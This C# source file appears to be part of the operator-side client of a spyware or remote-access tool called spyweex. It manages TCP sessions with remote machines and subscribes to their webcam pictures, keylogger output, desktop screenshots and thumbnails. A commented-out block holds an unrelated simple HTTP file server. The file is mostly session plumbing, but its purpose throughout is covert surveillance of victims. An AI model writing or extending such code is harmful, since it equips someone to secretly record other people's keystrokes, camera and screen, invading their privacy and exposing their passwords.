using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Net;
using System.Reactive.Disposables;
using System.Reactive.Linq;
using System.Reactive.Subjects;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows;
using spyweex_client_wpf.Subscribers;
using static spyweex_client_wpf.WxhtpExceptions;

namespace spyweex_client_wpf
{
    public class WxhtpClient
    {
        
        /// <summary>
        /// the connected tcp client
        /// </summary>
        private readonly TcpClient _tcpClient;

        /// <summary>
        /// executes tasks we give
        /// </summary>        
        private readonly AsyncTaskExecutor _asyncTaskExecutor;

        /// <summary>
        /// network stream to maintain the connection
        /// </summary>
        public NetworkStream networkStream;

        /// <summary>
        /// ref to dictionary of connections, needed to remove wxhtpclient itself
        /// </summary>
        ConcurrentDictionary<IPEndPoint, WxhtpClient> _refdictionary;

        /// <summary>
        /// Key to find wxhtpclient from dictionary
        /// </summary>
        IPEndPoint _keyEndPoint;

        public ViewModel _viewModel;

        private WebCamPicListener _webCamPicListener;
        private KeyloggerListener _keyloggerListener;
        private DesktopScreenListener _desktopScreenListener;
        private ThumbnailListener _thumbnailListener;

        /// <summary>
        /// Verifies if the console is attached or not
        /// </summary>
        public bool isConsoleAttached = false;

        public WxhtpClient(ref TcpClient tcpClient, ref ConcurrentDictionary<IPEndPoint, WxhtpClient> dictionary, ViewModel vm)
        {
            #region commented code
            //// Объявим строку, в которой будет хранится запрос клиента
            //string request = "";
            //// Буфер для хранения принятых от клиента данных
            //byte[] buffer = new byte[1024];
            //// Переменная для хранения количества байт, принятых от клиента
            //int count;
            //// Читаем из потока клиента до тех пор, пока от него поступают данные
            //while ((count = client.GetStream().Read(buffer, 0, buffer.Length)) > 0)
            //{
            //    // Преобразуем эти данные в строку и добавим ее к переменной Request
            //    request += Encoding.ASCII.GetString(buffer, 0, count);
            //    // Запрос должен обрываться последовательностью \r\n\r\n
            //    // Либо обрываем прием данных сами, если длина строки Request превышает 4 килобайта
            //    // Нам не нужно получать данные из POST-запроса (и т. п.), а обычный запрос
            //    // по идее не должен быть больше 4 килобайт
            //    if (request.IndexOf("\r\n\r\n") >= 0 || request.Length > 4096)
            //    {
            //        break;
            //    }
            //}

            //// Парсим строку запроса с использованием регулярных выражений
            //// При этом отсекаем все переменные GET-запроса
            //Match reqMatch = Regex.Match(request, @"^\w+\s+([^\s\?]+)[^\s]*\s+WXHTP/.*|");

            //// Если запрос не удался
            //if (reqMatch == Match.Empty)
            //{
            //    // Передаем клиенту ошибку 400 - неверный запрос
            //    SendError(client, 400);
            //    return;
            //}

            //// Получаем строку запроса
            //string requestUri = reqMatch.Groups[1].Value;

            //// Приводим ее к изначальному виду, преобразуя экранированные символы
            //// Например, "%20" -> " "
            //requestUri = Uri.UnescapeDataString(requestUri);

            //// Если в строке содержится двоеточие, передадим ошибку 400
            //// Это нужно для защиты от URL типа http://example.com/../../file.txt
            //if (requestUri.IndexOf("..") >= 0)
            //{
            //    SendError(client, 400);
            //    return;
            //}

            //// Если строка запроса оканчивается на "/", то добавим к ней index.html
            //if (requestUri.EndsWith("/"))
            //{
            //    requestUri += "index.html";
            //}

            //string filePath = "www/" + requestUri;

            //// Если в папке www не существует данного файла, посылаем ошибку 404
            //if (!File.Exists(filePath))
            //{
            //    SendError(client, 404);
            //    return;
            //}

            //// Получаем расширение файла из строки запроса
            //string extension = requestUri.Substring(requestUri.LastIndexOf('.'));

            //// Тип содержимого
            //string contentType = "";

            //// Пытаемся определить тип содержимого по расширению файла
            //switch (extension)
            //{
            //    case ".htm":
            //    case ".html":
            //        contentType = "text/html";
            //        break;
            //    case ".css":
            //        contentType = "text/stylesheet";
            //        break;
            //    case ".js":
            //        contentType = "text/javascript";
            //        break;
            //    case ".jpg":
            //        contentType = "image/jpeg";
            //        break;
            //    case ".jpeg":
            //    case ".png":
            //    case ".gif":
            //        contentType = "image/" + extension.Substring(1);
            //        break;
            //    default:
            //        if (extension.Length > 1)
            //        {
            //            contentType = "application/" + extension.Substring(1);
            //        }
            //        else
            //        {
            //            contentType = "application/unknown";
            //        }
            //        break;
            //}

            //// Открываем файл, страхуясь на случай ошибки
            //FileStream fs;
            //try
            //{
            //    fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
            //}
            //catch (Exception)
            //{
            //    // Если случилась ошибка, посылаем клиенту ошибку 500
            //    SendError(client, 500);
            //    return;
            //}

            //// Посылаем заголовки
            //string headers = "HTTP/1.1 200 OK\nContent-Type: " + contentType + "\nContent-Length: " + fs.Length + "\n\n";
            //byte[] headersBuffer = Encoding.ASCII.GetBytes(headers);
            //client.GetStream().Write(headersBuffer, 0, headersBuffer.Length);

            //// Пока не достигнут конец файла
            //while (fs.Position < fs.Length)
            //{
            //    // Читаем данные из файла
            //    count = fs.Read(buffer, 0, buffer.Length);
            //    // И передаем их клиенту
            //    client.GetStream().Write(buffer, 0, count);
            //}

            //// Закроем файл и соединение
            //fs.Close();
            //client.Close();
            #endregion

            _tcpClient = tcpClient;
            _viewModel = vm;
            _tcpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

            networkStream = _tcpClient.GetStream();
            _refdictionary = dictionary;

            _desktopScreenListener = new DesktopScreenListener();
            _webCamPicListener = new WebCamPicListener();
            _keyloggerListener = new KeyloggerListener();
            _thumbnailListener = new ThumbnailListener();

            _keyEndPoint = ((IPEndPoint)tcpClient.Client.RemoteEndPoint);
            _asyncTaskExecutor = new AsyncTaskExecutor(this);
            _asyncTaskExecutor.Start();
        }

        #region subscribers
        public void DesktopScreenListenerSubscribe()
        {
            _desktopScreenListener.Subscribe(this);
        }

        public void WebCamPicListenerSubscribe()
        {
            _webCamPicListener.Subscribe(this);
        }

        public void KeyloggerListenerSubscribe()
        {
            _keyloggerListener.Subscribe(this);
        }

        public void ThumbnailListenerSubscribe()
        {
            _thumbnailListener.Subscribe(this);
        }

        public bool isDesktopScreenListenerSubscribed()
        {
            return _desktopScreenListener.isSubscribed;
        }

        public bool isWebCamPicListenerSubscribed()
        {
            return _webCamPicListener.isSubscribed;
        }

        public bool isKeyloggerListenerSubscribed()
        {
            return _keyloggerListener.isSubscribed;
        }

        public bool isThumbnailListenerSubscribed()
        {
            return _thumbnailListener.isSubscribed;
        }

        public void DesktopScreenListenerUnSubscribe()
        {
            _desktopScreenListener.UnsubscribeAsync();
        }

        public void WebCamPicListenerUnSubscribe()
        {
            _webCamPicListener.UnsubscribeAsync();
        }

        public void KeyloggerListenerUnSubscribe()
        {
            _keyloggerListener.UnsubscribeAsync();
        }

        public void ThumbnailListenerUnSubscribe()
        {
            _thumbnailListener.UnsubscribeAsync();
        }

        #endregion

        public TcpClient getTcpClient()
        {
            return _tcpClient;
        }

        public AsyncTaskExecutor GetAsyncTaskExecutor()
        {
            return _asyncTaskExecutor;
        }

        public async Task ExecuteTask(CancellationToken ct, params string[] listOfParams)
        {
            await _asyncTaskExecutor.Execute(ct, listOfParams);
        }

        public void Close()
        {
            WxhtpClient wxcl;
            _viewModel.TryRemoveSession(_tcpClient.Client.RemoteEndPoint.ToString());
            _asyncTaskExecutor.Stop();
            networkStream.Close();
            _tcpClient.Close();
            _tcpClient.Dispose();
           if(isDesktopScreenListenerSubscribed()) DesktopScreenListenerUnSubscribe();
           if(isWebCamPicListenerSubscribed()) WebCamPicListenerUnSubscribe();
           if(isKeyloggerListenerSubscribed()) KeyloggerListenerUnSubscribe();

            _refdictionary.TryRemove(_keyEndPoint, out wxcl);
        }
    }

    internal static class CancellationExtension
    {
        public static Task<T> WithCancellation<T>(this Task<T> task, CancellationToken cancellationToken)
        {
            return task.IsCompleted
                    ? task
                    : task.ContinueWith(
                        completedTask => completedTask.GetAwaiter().GetResult(),
                        cancellationToken,
                        TaskContinuationOptions.ExecuteSynchronously,
                        TaskScheduler.Default);
        }
    }

}
